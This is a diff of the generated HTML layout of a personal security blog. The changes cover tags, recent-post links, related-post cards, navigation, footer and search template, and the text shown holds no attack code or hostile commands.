-      <div class="d-flex flex-wrap mt-3 mb-1 mr-3">
-
-      
-        
-        <a class="post-tag" href="/blog/en/tags/pwn/">pwn</a>
-      
-        
-        <a class="post-tag" href="/blog/en/tags/hackthebox/">hackthebox</a>
-      
-        
-        <a class="post-tag" href="/blog/en/tags/network/">network</a>
-      
-        
-        <a class="post-tag" href="/blog/en/tags/kma/">kma</a>
-      
-        
-        <a class="post-tag" href="/blog/en/tags/machine/">machine</a>
-      
-        
-        <a class="post-tag" href="/blog/en/tags/reverse-engineer/">reverse engineer</a>
-      
-        
-        <a class="post-tag" href="/blog/en/tags/content/">content</a>
-      
-        
-        <a class="post-tag" href="/blog/en/tags/miscs/">miscs</a>
-      
-        
-        <a class="post-tag" href="/blog/en/tags/on-going/">On-going</a>
-      
-        
-        <a class="post-tag" href="/blog/en/tags/practical-reverse-engineering/">Practical Reverse Engineering</a>
-      
-
-      </div>
     </div>
-  
-  </div> <!-- .access -->
+  </div> <!-- #core-wrapper -->
+
+  <!-- pannel -->
+  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">
+
+    <div class="access">
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <div id="access-lastmod" class="post">
+    <div class="panel-heading">Recent Update</div>
+    <ul class="post-content pl-0 pb-1 ml-1 mt-2">
+      
+        
+        
+        
+      <li><a href="/blog/en/posts/pwns-1/">PWN Journey - Part 1</a></li>
+      
+        
+        
+        
+      <li><a href="/blog/en/posts/HTB-BountyHunter/">HackTheBox - BountyHunter</a></li>
+      
+        
+        
+        
+      <li><a href="/blog/en/posts/HTB-Cap/">HackTheBox - Cap</a></li>
+      
+        
+        
+        
+      <li><a href="/blog/en/posts/PRE-C1-E1/">PRE Solutions Series: First Chapter</a></li>
+      
+        
+        
+        
+      <li><a href="/blog/en/posts/Update-Note/">Update.txt</a></li>
+      
+    </ul>
+  </div> <!-- #access-lastmod -->
+
+
+
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
   
-    <!-- BS-toc.js will be loaded at medium priority -->
-    <script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>
-    <div id="toc-wrapper" class="pl-0 pr-4 mb-5">
-      <span class="pl-3 pt-2 mb-2">Contents</span>
-      <nav id="toc" data-toggle="toc"></nav>
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+
+
+  <div id="access-tags">
+    <div class="panel-heading">Trending Tags</div>
+    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">
+
+    
+      
+      <a class="post-tag" href="/blog/en/tags/pwn/">pwn</a>
+    
+      
+      <a class="post-tag" href="/blog/en/tags/hackthebox/">hackthebox</a>
+    
+      
+      <a class="post-tag" href="/blog/en/tags/network/">network</a>
+    
+      
+      <a class="post-tag" href="/blog/en/tags/reverse-engineer/">reverse engineer</a>
+    
+      
+      <a class="post-tag" href="/blog/en/tags/kma/">kma</a>
+    
+      
+      <a class="post-tag" href="/blog/en/tags/machine/">machine</a>
+    
+      
+      <a class="post-tag" href="/blog/en/tags/content/">content</a>
+    
+      
+      <a class="post-tag" href="/blog/en/tags/google-analytics/">google analytics</a>
+    
+      
+      <a class="post-tag" href="/blog/en/tags/miscs/">miscs</a>
+    
+      
+      <a class="post-tag" href="/blog/en/tags/on-going/">On-going</a>
+    
+
     </div>
-  
-
-</div> <!-- #panel-wrapper -->
+  </div>
 
 
-</div> <!-- .row -->
+    </div>
+
+    
+      
+      
+
+
+
+<!-- BS-toc.js will be loaded at medium priority -->
+<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>
+
+<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
+  <div class="panel-heading pl-3 pt-2 mb-2">Contents</div>
+  <nav id="toc" data-toggle="toc"></nav>
+</div>
+
+
+    
+  </div>
+
+</div>
+
+<!-- tail -->
 
 <div class="row">
   <div class="col-12 col-lg-11 col-xl-8">
-    <div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
-
-    <!--
+    <div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
+      
+        
+        <!--
  Recommend the other 3 posts according to the tags and categories of the current post,
  if the number is not enough, use the other latest posts to supplement.
 -->
@@ -2041,7 +2102,33 @@ Password: 240610708
   
 
   
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
     
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
   
 
   
@@ -2102,17 +2189,16 @@ Password: 240610708
           <div class="card-body">
             <!--
   Date format snippet
-  See: /assets/js/_utils/timeage.js
+  See: ${JS_ROOT}/utils/timeago.js
 -->
 
 
 
 
 
-
-<span class="timeago small"
-  >Feb 24<i class="unloaded">2021-02-24T03:45:00+08:00</i>
-</span>
+<em class="timeago small"
+    date="2021-02-24 03:45:00 +0800"
+    >Feb 24</em>
 
             <h3 class="pt-0 mt-1 mb-3" data-toc-skip>KCSC - A simple BOF</h3>
             <div class="text-muted small">
@@ -2149,21 +2235,56 @@ Password: 240610708
       
       
       <div class="card">
-        <a href="/blog/en/posts/HTB-BountyHunter/">
+        <a href="/blog/en/posts/pwns-1/">
           <div class="card-body">
             <!--
   Date format snippet
-  See: /assets/js/_utils/timeage.js
+  See: ${JS_ROOT}/utils/timeago.js
 -->
 
 
 
 
 
+<em class="timeago small"
+    date="2021-12-08 00:00:00 +0800"
+    >Dec  8</em>
 
-<span class="timeago small"
-  >Oct  3<i class="unloaded">2021-10-03T00:00:00+08:00</i>
-</span>
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>PWN Journey - Part 1</h3>
+            <div class="text-muted small">
+              <p>
+                
+
+
+
+
+
+                Foreword
+
+Greetings, this series of posts delves into a collection of pwnie solutions that I have been poking around for a while and finally have the time to publish it so that I could practice my ...
+              </p>
+            </div>
+          </div>
+        </a>
+      </div>
+    
+      
+      
+      <div class="card">
+        <a href="/blog/en/posts/HTB-BountyHunter/">
+          <div class="card-body">
+            <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/timeago.js
+-->
+
+
+
+
+
+<em class="timeago small"
+    date="2021-10-03 00:00:00 +0800"
+    >Oct  3</em>
 
             <h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - BountyHunter</h3>
             <div class="text-muted small">
@@ -2187,55 +2308,21 @@ Nmap outp...
         </a>
       </div>
     
-      
-      
-      <div class="card">
-        <a href="/blog/en/posts/HTB-Cap/">
-          <div class="card-body">
-            <!--
-  Date format snippet
-  See: /assets/js/_utils/timeage.js
--->
-
-
-
-
-
-
-<span class="timeago small"
-  >Oct  1<i class="unloaded">2021-10-01T00:00:00+08:00</i>
-</span>
-
-            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Cap</h3>
-            <div class="text-muted small">
-              <p>
-                
-
-
-
-
-
-                Hello everyone, while preparing chapters of the book Practical Reverse Engineering, I occasionally got bored and wanted to do something else to have my mind a reboot. That is the reason why we are ...
-              </p>
-            </div>
-          </div>
-        </a>
-      </div>
-    
     </div> <!-- .card-deck -->
   </div> <!-- #related-posts -->
 
 
-
-    <!--
+      
+        
+        <!--
   Navigation buttons at the bottom of the post.
 -->
 
 <div class="post-navigation d-flex justify-content-between">
   
-  <a href="/blog/en/posts/README/" class="btn btn-outline-primary"
+  <a href="/blog/en/posts/enable-google-pv/" class="btn btn-outline-primary"
     prompt="Older">
-    <p>A README.md</p>
+    <p>Enable Google Page Views</p>
   </a>
   
 
@@ -2248,13 +2335,17 @@ Nmap outp...
 
 </div>
 
+      
+        
+        <!--
+  The Disqus lazy loading.
+-->
 
-    
 
-    </div> <!-- #post-extend-wrapper -->
 
-  </div> <!-- .col-* -->
-
+      
+    </div>
+  </div>
 </div> <!-- .row -->
 
 
@@ -2264,7 +2355,7 @@ Nmap outp...
 -->
 
 <footer class="d-flex w-100 justify-content-center">
-  <div class="d-flex justify-content-between align-items-center">
+  <div class="d-flex justify-content-between align-items-center text-muted">
     <div class="footer-left">
       <p class="mb-0">
         © 2021
@@ -2299,8 +2390,6 @@ Nmap outp...
 <div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
   <div class="col-12 col-sm-11 post-content">
     <div id="search-hints">
-      <h4 class="text-muted mb-4">Trending Tags</h4>
-
       
 
 
@@ -2351,46 +2440,6 @@ Nmap outp...
     
     
     
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
     
   
     
@@ -2457,49 +2506,6 @@ Nmap outp...
     
     
     
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
   
     
     
@@ -2524,16 +2530,40 @@ Nmap outp...
     
     
     
-      
-        
-        
-
   
     
     
     
     
-      
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
     
   
     
@@ -2564,6 +2594,131 @@ Nmap outp...
     
     
     
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
       
     
   
@@ -2602,89 +2757,47 @@ Nmap outp...
         
         
 
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-        
-        
 
 
+  <div id="access-tags">
+    <div class="panel-heading">Trending Tags</div>
+    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">
 
+    
       
-        
-        <a class="post-tag" href="/blog/en/tags/pwn/">pwn</a>
+      <a class="post-tag" href="/blog/en/tags/pwn/">pwn</a>
+    
       
-        
-        <a class="post-tag" href="/blog/en/tags/hackthebox/">hackthebox</a>
+      <a class="post-tag" href="/blog/en/tags/hackthebox/">hackthebox</a>
+    
       
-        
-        <a class="post-tag" href="/blog/en/tags/network/">network</a>
+      <a class="post-tag" href="/blog/en/tags/network/">network</a>
+    
       
-        
-        <a class="post-tag" href="/blog/en/tags/kma/">kma</a>
+      <a class="post-tag" href="/blog/en/tags/reverse-engineer/">reverse engineer</a>
+    
       
-        
-        <a class="post-tag" href="/blog/en/tags/machine/">machine</a>
+      <a class="post-tag" href="/blog/en/tags/kma/">kma</a>
+    
       
-        
-        <a class="post-tag" href="/blog/en/tags/reverse-engineer/">reverse engineer</a>
+      <a class="post-tag" href="/blog/en/tags/machine/">machine</a>
+    
       
-        
-        <a class="post-tag" href="/blog/en/tags/content/">content</a>
+      <a class="post-tag" href="/blog/en/tags/content/">content</a>
+    
       
-        
-        <a class="post-tag" href="/blog/en/tags/miscs/">miscs</a>
+      <a class="post-tag" href="/blog/en/tags/google-analytics/">google analytics</a>
+    
       
-        
-        <a class="post-tag" href="/blog/en/tags/on-going/">On going</a>
+      <a class="post-tag" href="/blog/en/tags/miscs/">miscs</a>
+    
       
-        
-        <a class="post-tag" href="/blog/en/tags/practical-reverse-engineering/">Practical Reverse Engineering</a>
-      
+      <a class="post-tag" href="/blog/en/tags/on-going/">On-going</a>
+    
+
+    </div>
+  </div>
+
 
     </div>
     <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
@@ -2718,7 +2831,7 @@ SimpleJekyllSearch({
   searchInput: document.getElementById('search-input'),
   resultsContainer: document.getElementById('search-results'),
   json: '/blog/en/assets/js/data/search.json',
-  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="https://legiahuyy.github.io{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
+  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
   noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
   templateMiddleware: function(prop, value, template) {
     if (prop === 'categories') {
